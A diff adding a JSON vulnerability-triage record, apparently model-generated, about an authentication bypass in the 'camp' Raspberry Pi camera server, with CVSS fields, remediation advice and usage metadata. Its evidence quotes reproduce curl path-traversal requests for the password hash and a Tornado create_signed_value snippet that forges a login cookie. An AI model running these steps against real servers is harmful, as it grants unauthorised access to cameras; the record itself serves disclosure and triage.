@@ -1,0 +1,69 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "The 'camp' Raspberry Pi camera server allows authentication bypass: an attacker can read the stored SHA-512 password hash via crafted requests to /static paths and then create a signed session cookie (using Tornado's create_signed_value) to authenticate as a user without knowing the password.",
+    "affected_product": "camp (GitHub) version < bf6af5c2e5cf713e4050c11c52dd4c55e89880b1",
+    "cwe": "CWE-639",
+    "cwe_quote": "Fetch the SHA-512 password hash using one of these methods:\n\ncurl http://localhost:8000/static/password.tx%74\n\nOR\n\ncurl http://localhost:8000/static/./password.txt --path-as-is\n\nOR\n\ncurl http://localhost:8000/static/../camp/password.txt --path-as-is",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "curl http://localhost:8000/static/password.tx%74"
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "N",
+        "quote": "curl http://localhost:8000/static/password.tx%74"
+      },
+      "UI": {
+        "value": "N",
+        "quote": ""
+      },
+      "S": {
+        "value": "U",
+        "quote": ""
+      },
+      "C": {
+        "value": "L",
+        "quote": "you will be logged in."
+      },
+      "I": {
+        "value": "L",
+        "quote": "you will be logged in."
+      },
+      "A": {
+        "value": "N",
+        "quote": ""
+      }
+    },
+    "recommended_next_step": "Verify the server's static file handling and session signing. Immediately remove or restrict access to password.txt, disable serving files under /static/ that allow path-traversal, and update session signing to use a server-side secret not derivable from the exposed hash. Prepare a patch to prevent path traversal and to avoid exposing password hashes.",
+    "confidence": "high",
+    "evidence_quotes": [
+      {
+        "claim": "Method to fetch password hash via crafted static path",
+        "quote": "curl http://localhost:8000/static/password.tx%74"
+      },
+      {
+        "claim": "Alternative path-as-is request showing traversal",
+        "quote": "curl http://localhost:8000/static/../camp/password.txt --path-as-is"
+      },
+      {
+        "claim": "Exploit uses Tornado create_signed_value to craft cookie",
+        "quote": "from tornado.web import create_signed_value\nimport time\nprint(create_signed_value(\"5895bb1bccf1da795c83734405a7a0193fbb56473842118dd1b66b2186a290e00fa048bc2a302d763c381ea3ac3f2bc2f30aaa005fb2c836bbf641d395c4eb5e\", \"camp\", str(time.time())))"
+      },
+      {
+        "claim": "Set cookie and gain login",
+        "quote": "In the browser, navigate to http://localhost:8000/, add a cookie named \"camp\" and set the value to the result of the script from step 3, then reload the page. You will be logged in."
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 2027,
+    "output_tokens": 776,
+    "latency_s": null,
+    "batch": true
+  }
+}
